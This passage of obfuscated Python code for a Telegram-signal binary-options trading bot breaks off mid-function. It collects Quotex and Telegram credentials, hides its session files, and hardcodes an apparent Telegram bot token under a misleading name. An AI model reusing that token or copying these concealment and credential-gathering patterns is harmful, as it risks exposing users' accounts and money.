_E0='[bold yellow]DEMO[/bold yellow]'
_D_='[bold green]REAL[/bold green]'
_Dz='chat_titles'
_Dy='enable_telethon_raw_data_debug'
_Dx='Monitored_Account'
_Dw='tournamentId'
_Dv='requestId'
_Du='bold green'
_Dt='payout_5m'
_Ds='print_lock'
_Dr='send_lock'
_Dq='started_listen_instruments'
_Dp='https_url'
_Do='keep_code'
_Dn='application/x-www-form-urlencoded'
_Dm='Content-Type'
_Dl='auth__error'
_Dk='market-qx.pro'
_Dj='WEBSOCKET_CLIENT_CA_BUNDLE'
_Di='Direction'
_Dh='Platform ID'
_Dg='result_equal'
_Df='result_loss'
_De='result_win'
_Dd='shutdown_stopped'
_Dc='shutdown_tasks_stopped'
_Db='shutdown_closing_services'
_Da='shutdown_received'
_DZ='init_connections'
_DY='final_summary_metric_win_rate'
_DX='final_summary_metric_equal'
_DW='final_summary_metric_losses'
_DV='final_summary_metric_wins'
_DU='final_summary_metric_total_trades'
_DT='final_summary_metric_net_pl'
_DS='final_summary_metric_final_bal'
_DR='final_summary_metric_initial_bal'
_DQ='final_summary_col_value'
_DP='final_summary_col_metric'
_DO='final_summary_title'
_DN='final_log_col_pnl'
_DM='final_log_col_result'
_DL='final_log_col_amount'
_DK='final_log_col_dir'
_DJ='final_log_col_asset'
_DI='final_log_col_source'
_DH='final_log_col_num'
_DG='final_log_no_trades'
_DF='license_check_terminating'
_DE='license_check_failed_reason'
_DD='license_check_failed_critical'
_DC='license_check_periodic'
_DB='auth_bot_success'
_DA='auth_bot_exiting'
_D9='auth_bot_fail_details'
_D8='auth_bot_critical_fail'
_D7='auth_bot_timeout'
_D6='auth_bot_parse_fail'
_D5='auth_bot_req_denied'
_D4='error_quotex_id_missing'
_D3='quotex_setup_complete'
_D2='tg_disconnecting_restarting'
_D1='tg_listening_for_signals'
_D0='error_tg_connection_monitor'
_C_='tg_connection_checker_disconnected'
_Cz='executing_signal_trade'
_Cy='payout_low_skipped'
_Cx='asset_closed_skipped'
_Cw='mtg_active_signal_skipped'
_Cv='error_signal_processor'
_Cu='signal_execute_duration'
_Ct='signal_execute_action'
_Cs='signal_execute_asset'
_Cr='signal_execute_source'
_Cq='signal_execute_title'
_Cp='signal_scheduled_entry'
_Co='signal_scheduled_action'
_Cn='signal_scheduled_asset'
_Cm='signal_scheduled_from'
_Cl='signal_scheduled_title'
_Ck='tg_setup_failed'
_Cj='error_chat_input_nan'
_Ci='error_chat_invalid_number'
_Ch='error_chat_input_empty'
_Cg='tg_prompt_chat_selection'
_Cf='tg_chat_type_group'
_Ce='tg_chat_type_channel'
_Cd='tg_chat_type_col'
_Cc='tg_chat_title_col'
_Cb='tg_chat_num_col'
_Ca='tg_available_chats_title'
_CZ='tg_no_chats_found'
_CY='tg_login_failed'
_CX='tg_login_fetching_chats'
_CW='tg_prompt_2fa_password'
_CV='error_invalid_api_id'
_CU='tg_prompt_api_hash'
_CT='tg_prompt_api_id'
_CS='tg_prompt_phone'
_CR='tg_prompt_otp'
_CQ='tg_otp_verif_prompt'
_CP='tg_otp_verif_title'
_CO='tg_api_help_text'
_CN='tg_api_help_title'
_CM='tg_prompt_api_keys'
_CL='tg_setup_prompt'
_CK='tg_setup_title'
_CJ='quotex_connection_active'
_CI='password_not_found'
_CH='no_internet'
_CG='quotex_connection_failed'
_CF='quotex_connecting_initial'
_CE='quotex_reconnecting_attempt'
_CD='sl_disabled'
_CC='sp_disabled'
_CB='error_sl_non_negative'
_CA='prompt_stop_loss'
_C9='error_sp_non_negative'
_C8='prompt_stop_profit'
_C7='prompt_stop_profit_loss_header'
_C6='mtg_disabled'
_C5='mtg_configured'
_C4='error_levels_gt_one'
_C3='prompt_mtg_max_levels'
_C2='error_multiplier_gt_one'
_C1='prompt_mtg_multiplier'
_C0='mtg_enabled'
_B_='prompt_enable_mtg'
_Bz='error_payout_range'
_By='prompt_min_payout'
_Bx='error_amount_positive'
_Bw='prompt_trade_amount'
_Bv='account_type_set_demo'
_Bu='account_type_set_real'
_Bt='prompt_account_type'
_Bs='prompt_password'
_Br='prompt_email'
_Bq='quotex_config_prompt'
_Bp='quotex_config_title'
_Bo='config_saved'
_Bn='trade_command_sent'
_Bm='trade_skipped_ws_disconnected'
_Bl='stop_loss_reached_msg'
_Bk='stop_loss_reached_title'
_Bj='stop_profit_reached_msg'
_Bi='stop_profit_reached_title'
_Bh='mtg_cycle_success'
_Bg='mtg_max_level_reached'
_Bf='mtg_warn_missing_data'
_Be='mtg_error_data_issue'
_Bd='mtg_warn_invalid_duration'
_Bc='mtg_error_loop_not_running'
_Bb='mtg_placing_trade'
_Ba='mtg_triggered_level'
_BZ='mtg_triggered_title'
_BY='trade_result_close_time_price'
_BX='trade_result_open_time_price'
_BW='trade_result_result'
_BV='trade_result_asset'
_BU='trade_result_id'
_BT='trade_result_title'
_BS='trade_result_panel_title'
_BR='trade_opened_exp_time'
_BQ='trade_opened_open_time'
_BP='trade_opened_direction'
_BO='trade_opened_asset'
_BN='trade_opened_id'
_BM='trade_opened_title'
_BL='trade_opened_panel_title'
_BK='raw_ws_data_title'
_BJ='raw_data_error'
_BI='instrument_status_closed'
_BH='instrument_status_open'
_BG='instrument_payout5m_col'
_BF='instrument_payout1m_col'
_BE='instrument_status_col'
_BD='instrument_asset_col'
_BC='instrument_table_title'
_BB='instrument_none_avail'
_BA='instrument_update_msg'
_B9='instrument_update_panel_title'
_B8='pin_error_generic'
_B7='pin_closing_program'
_B6='pin_invalid_input'
_B5='pin_prompt'
_B4='pin_auth_title'
_B3='status_wins_no_mtg'
_B2='status_wl'
_B1='status_trades'
_B0='status_net_pl'
_A_='status_balance'
_Az='banner_credit'
_Ay='banner_quote_6'
_Ax='banner_quote_5'
_Aw='banner_quote_4'
_Av='banner_quote_3'
_Au='banner_quote_2'
_At='banner_quote_1'
_As='critical_error'
_Ar='websocket-client'
_Aq='color'
_Ap='%H:%M:%S'
_Ao='accountBalance'
_An='openPrice'
_Am='payout_1m'
_Al='current_period'
_Ak='current_asset'
_Aj='websocket_error_reason'
_Ai='wss_url'
_Ah='session'
_Ag='user_id'
_Af='message'
_Ae='token'
_Ad='Referer'
_Ac='class'
_Ab='User-Agent'
_Aa='win_trades_no_mtg'
_AZ='equal_trades'
_AY='final_log_title'
_AX='tg_user_not_authorized'
_AW='tg_connecting'
_AV='quotex_relogin_failed'
_AU='quotex_relogin_attempt'
_AT='quotex_connected_fetching_balance'
keyvalueEncrypt='7310382942'
_AS='error_invalid_integer'
_AR='trade_result_new_balance'
_AQ='trade_result_profit'
_AP='trade_result_amount'
_AO='trade_opened_amount'
_AN='httpx'
_AM='execution_timestamp'
_AL='duration'
_AK='title'
_AJ='assigned_number'
_AI='unknown_command_format'
_AH='call'
_AG='closeTimestamp'
_AF='closePrice'
_AE='profitAmount'
_AD='profit'
_AC='right'
_AB='bold'
_AA='last_signal_source'
_A9='_temp_status'
_A8='connection_monitor_task'
_A7='last_message_timestamp'
_A6='account_type'
_A5='user_agent'
_A4='session_cookies'
_A3='session_token'
_A2='success'
_A1='initial_balance'
_A0='loss_trades'
_z='Asset'
_y='socks'
_x='entry_time_str'
_w='unknown'
_v='next_assigned_trade_number'
_u='instruments'
_t='check_websocket_if_error'
_s='check_accepted_connection'
_r='error_invalid_number'
_q='ignore'
_p='utf-8'
_o='openTimestamp'
_n='command'
_m='is_open'
_l='bold magenta'
_k='current_balance'
_j='net_pnl'
_i='win_trades'
_h='blue'
_g='equal'
_f='open_trades_logged'
_e='check_rejected_connection'
_d='white'
_c='en'
_b='last_amount'
_a='source'
_Z='loss'
_Y='win'
_X='demoBalance'
_W='liveBalance'
_V='total_trades'
_U='magenta'
_T='level'
_S='ws_app'
_R='name'
_Q='amount'
_P='id'
_O='account_balance'
_N='red'
_M='check_websocket_if_connect'
_L='yellow'
_K='center'
_J='cyan'
_I='direction'
_H='result'
_G='green'
_F='asset'
_E='N/A'
_D=.0
_C=False
_B=True
_A=None
import sys,subprocess,os,platform,json,time,ssl,threading,logging,asyncio,re
from datetime import datetime,timedelta,time as dt_time
import warnings,ctypes
from zoneinfo import ZoneInfo
from urllib.parse import urlparse
import random
try:import msvcrt
except ImportError:import tty;import termios
try:import requests
except ImportError:pass
from rich.console import Console
from rich.table import Table
from rich.text import Text
from rich.style import Style
from rich.panel import Panel
from telethon import TelegramClient,events
from telethon.sessions import StringSession
from telethon.tl.functions.contacts import UnblockRequest
from telethon.errors import SessionPasswordNeededError,UserIsBlockedError
import pyfiglet,httpx,websocket
from bs4 import BeautifulSoup
import certifi
PIP_LIBRARIES={'rich':'rich','telethon':'telethon','pyfiglet':'pyfiglet',_AN:_AN,_Ar:'websocket','beautifulsoup4':'bs4','certifi':'certifi','pysocks':_y,'requests':'requests','tzdata':'tzdata'}
encryptkey='8319661177:AAEtN3V0HkqgquLdyoduRuztSBOshJa5DaQ'
def run_install_command(command_list,check=_B,show_output=_C):
	A=show_output
	try:B=_A if A else subprocess.DEVNULL;C=_A if A else subprocess.DEVNULL;D=subprocess.run(command_list,check=check,text=_B,stdout=B,stderr=C,encoding=_p,errors=_q);return D.returncode==0
	except(subprocess.CalledProcessError,FileNotFoundError):return _C
missing_libs=[]
print('Checking for required libraries...')
for(package,module)in PIP_LIBRARIES.items():
	try:
		if module==_y:__import__(_y,fromlist=[_y])
		else:__import__(module)
	except ImportError:missing_libs.append(package)
if missing_libs:
	print(f"Missing libraries detected: {', '.join(missing_libs)}");print('Attempting to install them now...');py_executable=sys.executable;install_command=[py_executable,'-m','pip','install','--upgrade']+missing_libs
	try:
		if not run_install_command(install_command,show_output=_B):raise subprocess.CalledProcessError(1,'pip install command failed')
		print('\nLibraries installed successfully. Restarting the script...');os.execv(py_executable,[py_executable]+sys.argv)
	except(subprocess.CalledProcessError,FileNotFoundError)as e:print(f"\n[ERROR] Failed to install libraries automatically.");print(f"Please install them manually by running this command:");print(f"pip install {' '.join(missing_libs)}");sys.exit(1)
console=Console()
warnings.filterwarnings(_q,category=DeprecationWarning)
LANG=_c
TRANSLATIONS={_c:{'shutdown_graceful':'Shutting down gracefully. Thank you for using ProfessorTrader!',_As:'A critical error occurred: {error}',_At:'The goal of a successful trader is to make the best trades. Money is secondary.',_Au:'In trading, the trend is your friend, except at the end when it bends.',_Av:"The four most dangerous words in investing are: 'This time it's different'.",_Aw:"Risk comes from not knowing what you're doing.",_Ax:'Patience is the key to trading success. Wait for the right setup.',_Ay:'Let your profits run and cut your losses short.',_Az:'Powered by trader - @Professor1Trader',_A_:'Balance',_B0:'Net P/L',_B1:'Trades',_B2:'W/L',_B3:'Wins (No MTG)',_B4:'🔐 Two-Factor Authentication Required 🔐',_B5:'│ 🔢 Enter PIN Code: ',_B6:'│ ❌ Invalid input. Please enter only numbers.',_B7:'\nClosing program due to user interrupt.',_B8:'Incorrect PIN. Please check your email and try again.',_B9:'📊 Instrument Update 📊',_BA:'Received and processed updated instrument list from Quotex.',_BB:'No instrument data available to display.',_BC:'Asset Trading Status and Payouts',_BD:_z,_BE:'Status',_BF:'1-Min Payout',_BG:'5-Min Payout',_BH:'OPEN',_BI:'CLOSED',_BJ:'Error displaying raw data: {e}',_BK:'RAW QUOTEX WS DATA',_BL:'TRADE #{number} OPENED [dim]({account})[/dim]',_BM:'📊 {title} 📊',_BN:_Dh,_BO:_z,_AO:'Amount',_BP:_Di,_BQ:'Open Time',_BR:'Expiration Time',_BS:'TRADE #{number} RESULT [dim]({account})[/dim]',_BT:'📈 {title} 📈',_BU:_Dh,_BV:_z,_BW:'Result',_AP:'Amount',_AQ:'Profit',_BX:'Open (Time/Price)',_BY:'Close (Time/Price)',_AR:'New Balance',_BZ:'💸 MTG TRIGGERED for {asset} 💸',_Ba:'Level: {level}/{max_levels}\nLosing Amount: ${losing_amount:.2f}\nNext Amount: ${next_amount:.2f}',_Bb:'   Placing immediate MTG trade: {direction}, {duration}s...',_Bc:'   [Error] Could not place MTG trade: Event loop not running.',_Bd:'   [Warning] Could not place MTG trade: Invalid duration ({duration}s).',_Be:'   [Error] Could not place MTG trade: Data issue for calculation. {e}',_Bf:'   [Warning] Could not place MTG trade: Missing data (direction/timestamps).',_Bg:'🚫 Max MTG level ({max_levels}) reached for {asset}. Resetting cycle.',_Bh:'✅ MTG cycle for {asset} successful! Resetting to base amount.',_Bi:'✅ STOP PROFIT REACHED ✅',_Bj:'Target of ${target:.2f} reached. Current P/L: ${pnl:+.2f}',_Bk:'🛑 STOP LOSS REACHED 🛑',_Bl:'Limit of ${limit:.2f} reached. Current P/L: ${pnl:+.2f}',_Bm:'SKIPPED: Trade for {asset} skipped: WebSocket not connected.',_Bn:'✅ Trade command for {asset} sent to the server.',_Bo:'\n✓ Configuration saved for next time.',_Bp:'⚙️ Quotex Configuration ⚙️',_Bq:'Please provide your Quotex and trading details to begin.',_Br:'Enter your Quotex email',_Bs:'Enter your Quotex password',_Bt:'Account type (0=Real, 1=Demo)',_Bu:'│ ▶️  Account type set to: REAL',_Bv:'│ ▶️  Account type set to: DEMO',_Bw:'Enter the base trade amount',_Bx:'│ ❌ Trade amount must be a positive number.',_r:'│ ❌ Invalid input. Please enter a valid number.',_By:'Min payout % to accept trades',_Bz:'│ ❌ Payout must be between 0 and 100.',_AS:'│ ❌ Invalid input. Please enter a valid integer.',_B_:'Enable Martingale (MTG) on loss? (y/n)',_C0:'│ ✅ Martingale enabled.',_C1:'    Multiplier',_C2:'│    ❌ Multiplier must be greater than 1.0.',_C3:'    Max Levels',_C4:'│    ❌ Max levels must be at least 1.',_C5:'│ ✅ MTG configured: Multiplier={multiplier}, Max Levels={levels}',_C6:'│ ℹ️ Martingale is disabled.',_C7:'Set Stop Profit / Stop Loss (enter 0 to disable)',_C8:'Stop Profit ($)',_C9:'│ ❌ Stop Profit must be a non-negative number.',_CA:'Stop Loss ($)',_CB:'│ ❌ Stop Loss must be a non-negative number.','sp_set':'│ ✅ Stop Profit target set to ${amount:.2f}',_CC:'│ ℹ️ Stop Profit is disabled.','sl_set':'│ ✅ Stop Loss limit set to ${amount:.2f}',_CD:'│ ℹ️ Stop Loss is disabled.','quotex_reconnecting':'[yellow]Quotex connection lost. Reconnecting...[/yellow]',_CE:'[yellow]Reconnecting... (Attempt {attempt}/{max_attempts})[/yellow]',_CF:'[yellow]Attempting initial Quotex connection...[/yellow]',_AT:'[green]Quotex connection established. Fetching balance...[/green]',_CG:'[yellow]Quotex connection failed. Checking internet...[/yellow]',_CH:'[yellow]No internet. Waiting for connection...[/yellow]',_AU:'[yellow]Session reconnect failed. Attempting full re-login...[/yellow]',_CI:'[bold red]Password not found. Cannot re-login.[/bold red]','quotex_new_session':'[yellow]New Quotex session acquired. Reconnecting...[/yellow]',_AV:'[red]Full Quotex re-login failed. Retrying...[/red]',_CJ:'[green]Quotex connection active. Monitoring for signals...[/green]',_CK:'📱 Telegram Setup 📱',_CL:'Configure your Telegram account to start monitoring signals.',_CM:'Do you have your Telegram API ID and Hash? (y/n)',_CN:'How to get Telegram API Keys',_CO:'\n[bold]Instructions[/bold]\n\n1. Sign up for Telegram using an official application.\n2. Log in to your Telegram core: [blue underline]https://my.telegram.org[/blue underline]\n3. Go to "[bold]API development tools[/bold]" and fill out the form.\n4. You will get basic addresses as well as the [bold cyan]api_id[/bold cyan] and [bold cyan]api_hash[/bold cyan] parameters required for user authorization.\n5. For the moment each number can only have one api_id connected to it.\n',_CP:'\n[yellow]📲 OTP VERIFICATION[/yellow]',_CQ:'[blue]Check your Telegram app for the verification code.[/blue]',_CR:'🔢 Enter the 5-digit verification code',_CS:'📞 Enter your Telegram phone number (e.g., +1234567890)',_CT:'🆔 Enter your Telegram API ID',_CU:'🔑 Enter your Telegram API Hash',_CV:'❌ Invalid input! API ID must be a number.',_AW:'[yellow]Connecting to Telegram...[/yellow]',_AX:'[yellow]User not authorized. Sending code...[/yellow]',_CW:'🔒 Two-Step Verification is enabled. Please enter your password',_CX:'[green]Login successful. Fetching chats...[/green]',_CY:'❌ Telegram login failed: {e}',_CZ:'❌ No channels or groups found.',_Ca:'Your Available Chats',_Cb:'#',_Cc:'Chat Title',_Cd:'Type',_Ce:'Channel',_Cf:'Group',_Cg:'📈 Enter the numbers of the chats to monitor (comma-separated)',_Ch:'❌ Input cannot be empty. Please enter at least one chat number.',_Ci:'❌ Invalid number detected. Please enter numbers from the list.',_Cj:'❌ Invalid input. Please enter numbers only.',_Ck:'\n[red]❌ Telegram setup failed. Please try again.[/red]',_Cl:'📨 SIGNAL SCHEDULED 📨',_Cm:'From: {source}',_Cn:'  Asset:    {asset}\n',_Co:'  Action:   {direction}\n',_Cp:'  Entry at: {entry_time}',_Cq:'🚨 EXECUTE SIGNAL NOW! 🚨',_Cr:'Source: {source}',_Cs:'  Asset:    ',_Ct:'  Action:   ',_Cu:'  Duration: ',_Cv:'❌ Error in signal processor: {e}',_Cw:'SKIPPED: New signal for {asset} ignored because an MTG cycle is already active.',_Cx:"SKIPPED: Asset '{asset}' is currently closed for trading.",_Cy:"SKIPPED: Payout for '{asset}' ({payout}%) is below minimum ({min_payout}%).",_Cz:'Executing signal trade for {asset} with base amount: ${amount:.2f}',_C_:'[yellow]! Telegram connection checker: Detected disconnection. Triggering reconnect...[/yellow]',_D0:'❌ Error in TG connection monitor: {e}',_D1:'[green][+] Now listening for signals on: {titles}[/green]',_D2:'[yellow]Disconnecting for a clean restart...[/yellow]','quotex_setup_logging_in':'[yellow]Logging in to Quotex...[/yellow]','quotex_login_failed_msg':'❌ Login failed: {message}','quotex_login_check_creds':'Please check your credentials and try again.',_D3:'Quotex setup complete. Account Type: {account_type}',_D4:'[bold red]Could not retrieve Quotex User ID. Cannot proceed with authentication.[/bold red]','auth_bot_reply_title':'Authorization Reply from @{bot_username}',_D5:'Authorization Denied. Reason: {reason}',_D6:'Failed to parse bot response: {e}','auth_bot_sending_request':'\n[cyan]Sending authentication request for Quotex ID [bold]{quotex_user_id}[/bold] to [bold]@{bot_username}[/bold]...[/cyan]',_D7:'Authorization timed out. No reply from @{bot_username} within 30 seconds.',_D8:'\n[bold red]CRITICAL: Telegram Bot Authentication Failed![/bold red]',_D9:'[red]Details: {message}[/red]',_DA:'[yellow]The program will now exit.[/yellow]',_DB:'\n[bold green]✅ Telegram Bot Authentication Successful![/bold green]',_DC:'[cyan]Performing periodic license check...[/cyan]',_DD:'\n[bold red]CRITICAL: Periodic License Check Failed![/bold red]',_DE:'[red]Reason: {reason}[/red]',_DF:'[yellow]The program will now terminate due to failed license validation.[/yellow]',_DG:'No trades were executed during this session.',_AY:'📜 Detailed Session Trade Log 📜',_DH:'#',_DI:'Source Channel',_DJ:_z,_DK:_Di,_DL:'Amount ($)',_DM:'Result',_DN:'P/L ($)',_DO:'📊 Final Trading Session Summary 📊',_DP:'Metric',_DQ:'Value',_DR:'Initial Balance',_DS:'Final Balance',_DT:'Net Profit/Loss',_DU:'Total Trades',_DV:'Wins',_DW:'Losses',_DX:'Equal',_DY:'Win Rate',_DZ:'[yellow]Initializing connections... Account: {account_type}[/yellow]',_Da:'\n\n[bold yellow]Shutdown signal received. Please wait...[/bold yellow]',_Db:'\n[bold yellow]Closing connections and stopping services...[/bold yellow]',_Dc:'[bold green]All background tasks stopped.[/bold green]\n',_Dd:'\n[bold magenta]ProfessorTrader has stopped.[/bold magenta]',_De:'WIN',_Df:'LOSS',_Dg:'EQUAL'}}
def t(key,**B):
	A=TRANSLATIONS.get(LANG,TRANSLATIONS[_c]).get(key,f"_{key}_")
	if B:
		try:return A.format(**B)
		except(KeyError,IndexError):return A
	return A
def hide_file(filepath):
	if os.name=='nt':
		try:
			A=ctypes.windll.kernel32.SetFileAttributesW(filepath,2)
			if not A:0
		except Exception:pass
logging.basicConfig(level=logging.WARNING,format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
for logger_name_to_silence in['urllib3',_Ar,'telethon.network.mtprotosender','telethon.client.updates','telethon.network.connection.connection',_AN]:logging.getLogger(logger_name_to_silence).setLevel(logging.ERROR)
STYLE_TRADE_NEW_HEADER=Style(color=_G,bold=_B)
STYLE_TRADE_RESULT_HEADER=Style(color=_U,bold=_B)
STYLE_ACCOUNT_NAME_HEADER=Style(color=_L,bold=_B)
STYLE_FIELD_NAME=Style(bold=_B,color=_J)
STYLE_VALUE_GREEN=Style(color=_G)
STYLE_VALUE_CYAN=Style(color=_J)
STYLE_VALUE_RED=Style(color=_N)
STYLE_VALUE_YELLOW=Style(color=_L)
STYLE_VALUE_WHITE=Style(color=_d)
STYLE_SEPARATOR=Style(color=_h,dim=_B)
STYLE_TABLE_HEADER=Style(color=_U,bold=_B)
STYLE_INFO_HEADER=Style(color=_U,bold=_B)
STYLE_INFO_FIELD=Style(color=_J)
STYLE_INFO_VALUE=Style(color=_d)
STYLE_INFO_MSG=Style(color=_h)
STYLE_SUCCESS_MSG=Style(color=_G)
STYLE_WARNING_MSG=Style(color=_L)
STYLE_ERROR_MSG=Style(color=_N)
STYLE_CONNECTION_INFO=Style(color=_J,dim=_B)
STYLE_HEADER=Style(color=_J,bold=_B)
STYLE_SUCCESS=Style(color=_G,bold=_B)
STYLE_ERROR=Style(color=_N,bold=_B)
STYLE_WARNING=Style(color=_L,bold=_B)
STYLE_INFO=Style(color=_h,bold=_B)
STYLE_INPUT=Style(color=_U,bold=_B)
SESSIONS_FILE='.sessions.json'
CONFIG_FILE='.config.json'
STOP_PROFIT=_D
STOP_LOSS=_D
shutdown_event=asyncio.Event()
OBFUSCATION_KEY=5
trade_stats={_V:0,_i:0,_A0:0,_AZ:0,_Aa:0,_j:_D,_k:_D,_A1:_D}
session_trade_log=[]
def obfuscate_data(data_string):return''.join([chr(ord(A)+OBFUSCATION_KEY)for A in data_string])
def deobfuscate_data(obfuscated_string):return''.join([chr(ord(A)-OBFUSCATION_KEY)for A in obfuscated_string])
def format_status_message(base_message):A=trade_stats;B=A[_j];C=_G if B>=0 else _N;D=A[_i]/A[_V]*100 if A[_V]>0 else _D;E=f"{t(_A_)}: [bold yellow]${A[_k]:.2f}[/bold yellow]";F=f"{t(_B0)}: [bold {C}]${B:+.2f}[/bold {C}]";G=f"{t(_B1)}: {A[_V]}";H=f"{t(_B2)}: [green]{A[_i]}[/green]/[red]{A[_A0]}[/red] ({D:.1f}%)";I=f"{t(_B3)}: [bold cyan]{A[_Aa]}[/bold cyan]";J=' [dim]|[/dim] ';K=J.join([E,F,G,H,I]);return Text.from_markup(f"{base_message}\n{K}")
os.environ['SSL_CERT_FILE']=certifi.where()
os.environ[_Dj]=certifi.where()
cacert=os.environ.get(_Dj)
ssl_context=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ssl_context.options|=ssl.OP_NO_TLSv1|ssl.OP_NO_TLSv1_1
ssl_context.minimum_version=ssl.TLSVersion.TLSv1_2
ssl_context.load_verify_locations(certifi.where())
g_account_context=_A
g_buy_id=_A
g_buy_successful=_A
USER_EMAIL=''
USER_PASSWORD=''
SOURCE_ACCOUNT_TYPE=1
TRADE_AMOUNT=1.
MIN_PAYOUT=70
USE_MTG=_C
MTG_MULTIPLIER=2.
MTG_MAX_LEVELS=2
SHOW_RAW_WEBSOCKET_DATA=_C
g_event_loop=_A
mtg_state={}
def getch():
	if os.name=='nt':return msvcrt.getch().decode(_p,errors=_q)
	else:
		A=sys.stdin.fileno();B=termios.tcgetattr(A)
		try:tty.setraw(sys.stdin.fileno());C=sys.stdin.read(1)
		finally:termios.tcsetattr(A,termios.TCSADRAIN,B)
		return C
def get_password(prompt=''):
	console.print(prompt,end='');sys.stdout.flush();B=''
	while _B:
		try:
			A=getch()
			if A=='\r'or A=='\n':print();break
			elif A=='\x03':raise KeyboardInterrupt
			elif A in('\x08','\x7f'):
				if len(B)>0:B=B[:-1];sys.stdout.write('\x08 \x08');sys.stdout.flush()
			elif not A.isprintable():continue
			else:B+=A;sys.stdout.write('*');sys.stdout.flush()
		except(UnicodeDecodeError,TypeError):continue
	return B
class QuotexLogin(httpx.AsyncClient):
	base_url=_Dk;https_base_url=f"https://{base_url}"
	def __init__(A,lang=_c,debug=_C,console_instance=_A,status_instance=_A,**B):A.lang=lang;A.full_url=f"{A.https_base_url}/{A.lang}";A.console=console_instance or Console();A.status=status_instance;A.ssid=_A;A.cookies_str=_A;C={_Ab:'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'};super().__init__(headers=C,verify=ssl_context,timeout=30,follow_redirects=_B,**B)
	def get_soup(A,response):return BeautifulSoup(response.text,'html.parser')
	def get_json(A,response):
		try:return response.json()
		except json.JSONDecodeError:return
	def get_cookies_string(A):return'; '.join(f"{A.name}={A.value}"for A in A.cookies.jar)
	def is_login_successful(D,response):
		A=response
		if not A:return _C,'No response to check.'
		if'trade'in str(A.url):return _B,'Login successful.'
		B=D.get_soup(A);C=B.find('div',{_Ac:'hint--danger'})or B.find('div',{_Ac:'input-control-cabinet__hint'})or B.find('div',class_=lambda x:x and(_Dl in x or'login-error'in x));E=C.text.strip()if C else'Unknown login error.';return _C,f"Login failed: {E}"
	async def get_token(A):
		D={'Accept-Language':f"{A.lang},{A.lang.split('-')[0]};q=0.9,en-US;q=0.8,en;q=0.7",'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',_Ad:f"{A.full_url}/sign-in",'Upgrade-Insecure-Requests':'1'}
		try:B=await A.get(f"{A.full_url}/sign-in/modal/",headers=D);B.raise_for_status();E=A.get_soup(B);C=E.find('input',{_R:'_token'});return C.get('value')if C else _A
		except httpx.RequestError as F:A.console.print(f"[red]Failed to get CSRF token: {F}[/red]");return
	async def awaiting_pin(A,data,input_message):
		C=data;B=input_message
		if A.status:A.status.stop()
		H={_Dm:_Dn,_Ad:f"{A.full_url}/sign-in/modal"};C[_Do]=1
		while _B:
			A.console.print(Panel(Text(B,justify=_K,style=_L),title=f"[bold cyan]{t(_B4)}[/bold cyan]",border_style=_J,padding=(1,2)))
			try:
				E=A.console.input(Text(t(_B5),style=_l))
				if not E.strip().isdigit():A.console.print(Text(t(_B6),style=STYLE_ERROR_MSG));B='The previous code was invalid. Please try again.';continue
				C['code']=E.strip()
			except KeyboardInterrupt:
				A.console.print(t(_B7))
				if A.status:A.status.start()
				sys.exit(1)
			if A.status:A.status.start();A.status.update(format_status_message(t(_AU)))
			try:
				D=await A.post(f"{A.full_url}/sign-in/modal",data=C,headers=H);I,L=A.is_login_successful(D)
				if I:
					if A.status:A.status.start()
					return D
				else:J=A.get_soup(D);F=J.find('div',class_=lambda x:x and('auth__pin-error'in x or _Dl in x));G=F.text.strip()if F else t(_B8);B=G;A.console.print(Text(f" │ ❌ {G}",style=STYLE_ERROR_MSG))
			except httpx.RequestError as K:A.console.print(f"[red]Error submitting PIN: {K}[/red]");B='A network error occurred. Please try again.'
	async def get_profile_data(A):
		try:C=await A.get(f"{A.full_url}/trade");C.raise_for_status()
		except httpx.RequestError as F:A.console.print(f"[red]Failed to fetch /trade page: {F}[/red]");return _A,_A,_A,_A,_A
		G=A.get_soup(C);D=next((A.get_text()for A in G.find_all('script')if'window.settings ='in A.get_text()),_A);B={}
		if D:
			E=re.search('window\\.settings\\s*=\\s*(\\{.*\\});',D,re.DOTALL)
			if E:
				try:B=json.loads(E.group(1))
				except json.JSONDecodeError:pass
		A.cookies_str=A.get_cookies_string();A.ssid=B.get(_Ae);H=A.headers.get(_Ab);I=B.get(_P)or B.get('user',{}).get(_P);return B,A.ssid,A.cookies_str,H,I
	async def _post_login(A,data):
		G={_Dm:_Dn,_Ad:f"{A.full_url}/sign-in/"}
		try:
			C=await A.post(f"{A.full_url}/sign-in/",data=data,headers=G);D,E=A.is_login_successful(C)
			if D:return _B,E
			F=A.get_soup(C)
			if F.find('input',{_R:_Do}):B=F.find('main',{_Ac:'auth__body'});H=f"{B.find('p').text.strip()}: "if B and B.find('p')else'Enter PIN code: ';I=await A.awaiting_pin(data,H);return A.is_login_successful(I)
			return D,E
		except httpx.RequestError as J:A.console.print(f"[red]Initial login POST request failed: {J}[/red]");return _C,'Login request failed.'
	async def __call__(A,username,password):
		B=await A.get_token()
		if not B:return _C,'Failed to retrieve CSRF token.',_A,_A,_A,_A
		F={'_token':B,'email':username,'password':password,'remember':1};G,C=await A._post_login(F)
		if G:
			J,D,E,H,I=await A.get_profile_data()
			if D and E:return _B,C,D,E,H,I
			else:return _C,'Login successful, but failed to retrieve session data.',_A,_A,_A,_A
		else:return _C,C,_A,_A,_A,_A
async def quotex_login(username,password,lang=_c,debug=_C,status=_A):
	try:
		async with QuotexLogin(lang=lang,debug=debug,console_instance=console,status_instance=status)as B:C,D,E,F,G,H=await B(username,password);return{_A2:C,_Af:D,_A3:E,_A4:F,_A5:G,_Ag:H,_Ah:_A}
	except Exception as A:console.print(f"[bold red]An unexpected error occurred during login: {A}[/bold red]");return{_A2:_C,_Af:f"Login process failed: {A}",_A3:_A,_A4:_A,_A5:_A,_Ag:_A,_Ah:_A}
def initialize_global_account_context(name,token,cookies,account_type=1,host=_Dk,user_agent='Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0',previous_context=_A):
